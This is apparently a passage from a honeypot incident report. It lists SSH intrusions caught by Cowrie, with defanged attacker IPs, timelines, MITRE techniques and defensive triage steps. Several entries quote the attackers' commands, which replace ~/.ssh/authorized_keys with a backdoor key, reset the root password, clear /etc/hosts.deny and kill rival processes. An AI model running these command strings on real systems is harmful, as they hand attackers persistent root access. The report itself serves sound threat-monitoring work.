| Field | Detail |
|---|---|
| **Source IP** | `115.191.34[.]255` |
| **First Seen** | 2026-06-12 20:46 |
| **Last Seen** | 2026-06-12 20:46 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:9qYPlV98q8Ef"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 20:46:02` | `cowrie.session.connect` |
| `2026-06-12 20:46:03` | `cowrie.client.version` |
| `2026-06-12 20:46:03` | `cowrie.client.kex` |
| `2026-06-12 20:46:04` | `cowrie.login.success` |
| `2026-06-12 20:46:04` | `cowrie.session.params` |
| `2026-06-12 20:46:04` | `cowrie.command.input` |
| `2026-06-12 20:46:04` | `cowrie.command.failed` |
| `2026-06-12 20:46:04` | `cowrie.log.closed` |
| `2026-06-12 20:46:04` | `cowrie.session.params` |
| `2026-06-12 20:46:04` | `cowrie.command.input` |
| `2026-06-12 20:46:05` | `cowrie.session.file_download` |
| `2026-06-12 20:46:05` | `cowrie.log.closed` |
| `2026-06-12 20:46:33` | `cowrie.session.params` |
| `2026-06-12 20:46:33` | `cowrie.command.input` |
| `2026-06-12 20:46:33` | `cowrie.log.closed` |
| `2026-06-12 20:46:33` | `cowrie.session.params` |
| `2026-06-12 20:46:33` | `cowrie.command.input` |
| `2026-06-12 20:46:34` | `cowrie.log.closed` |
| `2026-06-12 20:46:34` | `cowrie.session.params` |
| `2026-06-12 20:46:34` | `cowrie.command.input` |
| `2026-06-12 20:46:34` | `cowrie.session.file_download` |
| `2026-06-12 20:46:34` | `cowrie.log.closed` |
| `2026-06-12 20:46:34` | `cowrie.session.params` |
| `2026-06-12 20:46:34` | `cowrie.command.input` |
| `2026-06-12 20:46:35` | `cowrie.log.closed` |
| `2026-06-12 20:46:35` | `cowrie.session.params` |
| `2026-06-12 20:46:35` | `cowrie.command.input` |
| `2026-06-12 20:46:35` | `cowrie.log.closed` |
| `2026-06-12 20:46:35` | `cowrie.session.params` |
| `2026-06-12 20:46:35` | `cowrie.command.input` |
| `2026-06-12 20:46:35` | `cowrie.command.input` |
| `2026-06-12 20:46:36` | `cowrie.log.closed` |
| `2026-06-12 20:46:36` | `cowrie.session.params` |
| `2026-06-12 20:46:36` | `cowrie.command.input` |
| `2026-06-12 20:46:36` | `cowrie.log.closed` |
| `2026-06-12 20:46:37` | `cowrie.session.params` |
| `2026-06-12 20:46:37` | `cowrie.command.input` |
| `2026-06-12 20:46:37` | `cowrie.log.closed` |
| `2026-06-12 20:46:37` | `cowrie.session.params` |
| `2026-06-12 20:46:37` | `cowrie.command.input` |
| `2026-06-12 20:46:37` | `cowrie.log.closed` |
| `2026-06-12 20:46:38` | `cowrie.session.params` |
| `2026-06-12 20:46:38` | `cowrie.command.input` |
| `2026-06-12 20:46:38` | `cowrie.log.closed` |
| `2026-06-12 20:46:38` | `cowrie.session.params` |
| `2026-06-12 20:46:38` | `cowrie.command.input` |
| `2026-06-12 20:46:38` | `cowrie.log.closed` |
| `2026-06-12 20:46:39` | `cowrie.session.params` |
| `2026-06-12 20:46:39` | `cowrie.command.input` |
| `2026-06-12 20:46:39` | `cowrie.log.closed` |
| `2026-06-12 20:46:39` | `cowrie.session.params` |
| `2026-06-12 20:46:39` | `cowrie.command.input` |
| `2026-06-12 20:46:39` | `cowrie.log.closed` |
| `2026-06-12 20:46:40` | `cowrie.session.params` |
| `2026-06-12 20:46:40` | `cowrie.command.input` |
| `2026-06-12 20:46:40` | `cowrie.log.closed` |
| `2026-06-12 20:46:40` | `cowrie.session.params` |
| `2026-06-12 20:46:40` | `cowrie.command.input` |
| `2026-06-12 20:46:40` | `cowrie.log.closed` |
| `2026-06-12 20:46:41` | `cowrie.session.params` |
| `2026-06-12 20:46:41` | `cowrie.command.input` |
| `2026-06-12 20:46:41` | `cowrie.log.closed` |
| `2026-06-12 20:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.191.34[.]255` to AbuseIPDB if not already reported
- [ ] Block `115.191.34[.]255` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deddcf2b113b

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 20:53 |
| **Last Seen** | 2026-06-12 20:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 20:53:53` | `cowrie.session.connect` |
| `2026-06-12 20:53:53` | `cowrie.client.version` |
| `2026-06-12 20:53:53` | `cowrie.client.kex` |
| `2026-06-12 20:53:53` | `cowrie.login.success` |
| `2026-06-12 20:53:54` | `cowrie.session.params` |
| `2026-06-12 20:53:54` | `cowrie.command.input` |
| `2026-06-12 20:53:54` | `cowrie.command.failed` |
| `2026-06-12 20:53:54` | `cowrie.log.closed` |
| `2026-06-12 20:53:54` | `cowrie.session.params` |
| `2026-06-12 20:53:54` | `cowrie.command.input` |
| `2026-06-12 20:53:54` | `cowrie.session.file_download` |
| `2026-06-12 20:53:54` | `cowrie.log.closed` |
| `2026-06-12 20:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a99a40ac292c

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 20:53 |
| **Last Seen** | 2026-06-12 20:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 20:53:56` | `cowrie.session.connect` |
| `2026-06-12 20:53:56` | `cowrie.client.version` |
| `2026-06-12 20:53:56` | `cowrie.client.kex` |
| `2026-06-12 20:53:57` | `cowrie.login.success` |
| `2026-06-12 20:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc161aa50533

| Field | Detail |
|---|---|
| **Source IP** | `42.51.40[.]180` |
| **First Seen** | 2026-06-12 20:55 |
| **Last Seen** | 2026-06-12 20:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 20:55:27` | `cowrie.session.connect` |
| `2026-06-12 20:55:27` | `cowrie.client.version` |
| `2026-06-12 20:55:28` | `cowrie.client.kex` |
| `2026-06-12 20:55:28` | `cowrie.login.success` |
| `2026-06-12 20:55:28` | `cowrie.session.params` |
| `2026-06-12 20:55:28` | `cowrie.command.input` |
| `2026-06-12 20:55:28` | `cowrie.command.failed` |
| `2026-06-12 20:55:29` | `cowrie.log.closed` |
| `2026-06-12 20:55:29` | `cowrie.session.params` |
| `2026-06-12 20:55:29` | `cowrie.command.input` |
| `2026-06-12 20:55:29` | `cowrie.session.file_download` |
| `2026-06-12 20:55:29` | `cowrie.log.closed` |
| `2026-06-12 20:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.40[.]180` to AbuseIPDB if not already reported
- [ ] Block `42.51.40[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fece5b0d7a64

| Field | Detail |
|---|---|
| **Source IP** | `42.51.40[.]180` |
| **First Seen** | 2026-06-12 20:55 |
| **Last Seen** | 2026-06-12 20:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 20:55:31` | `cowrie.session.connect` |
| `2026-06-12 20:55:31` | `cowrie.client.version` |
| `2026-06-12 20:55:31` | `cowrie.client.kex` |
| `2026-06-12 20:55:32` | `cowrie.login.success` |
| `2026-06-12 20:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.40[.]180` to AbuseIPDB if not already reported
- [ ] Block `42.51.40[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af747ff8b80

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 20:58 |
| **Last Seen** | 2026-06-12 20:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 20:58:37` | `cowrie.session.connect` |
| `2026-06-12 20:58:37` | `cowrie.client.version` |
| `2026-06-12 20:58:37` | `cowrie.client.kex` |
| `2026-06-12 20:58:38` | `cowrie.login.success` |
| `2026-06-12 20:58:38` | `cowrie.session.params` |
| `2026-06-12 20:58:38` | `cowrie.command.input` |
| `2026-06-12 20:58:38` | `cowrie.command.failed` |
| `2026-06-12 20:58:38` | `cowrie.log.closed` |
| `2026-06-12 20:58:38` | `cowrie.session.params` |
| `2026-06-12 20:58:38` | `cowrie.command.input` |
| `2026-06-12 20:58:38` | `cowrie.session.file_download` |
| `2026-06-12 20:58:38` | `cowrie.log.closed` |
| `2026-06-12 20:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb412fad34a5

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 20:58 |
| **Last Seen** | 2026-06-12 20:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 20:58:40` | `cowrie.session.connect` |
| `2026-06-12 20:58:40` | `cowrie.client.version` |
| `2026-06-12 20:58:41` | `cowrie.client.kex` |
| `2026-06-12 20:58:41` | `cowrie.login.success` |
| `2026-06-12 20:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02182a5e9024

| Field | Detail |
|---|---|
| **Source IP** | `103.100.84[.]116` |
| **First Seen** | 2026-06-12 20:59 |
| **Last Seen** | 2026-06-12 20:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 20:59:14` | `cowrie.session.connect` |
| `2026-06-12 20:59:14` | `cowrie.client.version` |
| `2026-06-12 20:59:14` | `cowrie.client.kex` |
| `2026-06-12 20:59:15` | `cowrie.login.success` |
| `2026-06-12 20:59:15` | `cowrie.session.params` |
| `2026-06-12 20:59:15` | `cowrie.command.input` |
| `2026-06-12 20:59:15` | `cowrie.command.failed` |
| `2026-06-12 20:59:16` | `cowrie.log.closed` |
| `2026-06-12 20:59:16` | `cowrie.session.params` |
| `2026-06-12 20:59:16` | `cowrie.command.input` |
| `2026-06-12 20:59:16` | `cowrie.session.file_download` |
| `2026-06-12 20:59:16` | `cowrie.log.closed` |
| `2026-06-12 20:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.100.84[.]116` to AbuseIPDB if not already reported
- [ ] Block `103.100.84[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ea2381e2a42

| Field | Detail |
|---|---|
| **Source IP** | `103.100.84[.]116` |
| **First Seen** | 2026-06-12 20:59 |
| **Last Seen** | 2026-06-12 20:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 20:59:19` | `cowrie.session.connect` |
| `2026-06-12 20:59:19` | `cowrie.client.version` |
| `2026-06-12 20:59:19` | `cowrie.client.kex` |
| `2026-06-12 20:59:20` | `cowrie.login.success` |
| `2026-06-12 20:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.100.84[.]116` to AbuseIPDB if not already reported
- [ ] Block `103.100.84[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77210c8e0723

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:00 |
| **Last Seen** | 2026-06-12 21:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:00:56` | `cowrie.session.connect` |
| `2026-06-12 21:00:56` | `cowrie.client.version` |
| `2026-06-12 21:00:56` | `cowrie.client.kex` |
| `2026-06-12 21:00:57` | `cowrie.login.success` |
| `2026-06-12 21:00:57` | `cowrie.session.params` |
| `2026-06-12 21:00:57` | `cowrie.command.input` |
| `2026-06-12 21:00:57` | `cowrie.command.failed` |
| `2026-06-12 21:00:57` | `cowrie.log.closed` |
| `2026-06-12 21:00:57` | `cowrie.session.params` |
| `2026-06-12 21:00:57` | `cowrie.command.input` |
| `2026-06-12 21:00:58` | `cowrie.session.file_download` |
| `2026-06-12 21:00:58` | `cowrie.log.closed` |
| `2026-06-12 21:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-422583ec2fef

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:01 |
| **Last Seen** | 2026-06-12 21:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:01:00` | `cowrie.session.connect` |
| `2026-06-12 21:01:00` | `cowrie.client.version` |
| `2026-06-12 21:01:00` | `cowrie.client.kex` |
| `2026-06-12 21:01:00` | `cowrie.login.success` |
| `2026-06-12 21:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806c98d4073d

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:05 |
| **Last Seen** | 2026-06-12 21:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:05:29` | `cowrie.session.connect` |
| `2026-06-12 21:05:29` | `cowrie.client.version` |
| `2026-06-12 21:05:29` | `cowrie.client.kex` |
| `2026-06-12 21:05:29` | `cowrie.login.success` |
| `2026-06-12 21:05:30` | `cowrie.session.params` |
| `2026-06-12 21:05:30` | `cowrie.command.input` |
| `2026-06-12 21:05:30` | `cowrie.command.failed` |
| `2026-06-12 21:05:30` | `cowrie.log.closed` |
| `2026-06-12 21:05:30` | `cowrie.session.params` |
| `2026-06-12 21:05:30` | `cowrie.command.input` |
| `2026-06-12 21:05:30` | `cowrie.session.file_download` |
| `2026-06-12 21:05:30` | `cowrie.log.closed` |
| `2026-06-12 21:05:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75f65579e47c

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:05 |
| **Last Seen** | 2026-06-12 21:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:05:32` | `cowrie.session.connect` |
| `2026-06-12 21:05:32` | `cowrie.client.version` |
| `2026-06-12 21:05:32` | `cowrie.client.kex` |
| `2026-06-12 21:05:33` | `cowrie.login.success` |
| `2026-06-12 21:05:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51528d1f562d

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:07 |
| **Last Seen** | 2026-06-12 21:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:07:47` | `cowrie.session.connect` |
| `2026-06-12 21:07:47` | `cowrie.client.version` |
| `2026-06-12 21:07:47` | `cowrie.client.kex` |
| `2026-06-12 21:07:47` | `cowrie.login.success` |
| `2026-06-12 21:07:48` | `cowrie.session.params` |
| `2026-06-12 21:07:48` | `cowrie.command.input` |
| `2026-06-12 21:07:48` | `cowrie.command.failed` |
| `2026-06-12 21:07:48` | `cowrie.log.closed` |
| `2026-06-12 21:07:48` | `cowrie.session.params` |
| `2026-06-12 21:07:48` | `cowrie.command.input` |
| `2026-06-12 21:07:48` | `cowrie.session.file_download` |
| `2026-06-12 21:07:48` | `cowrie.log.closed` |
| `2026-06-12 21:07:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6399878808fb

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:07 |
| **Last Seen** | 2026-06-12 21:07 |
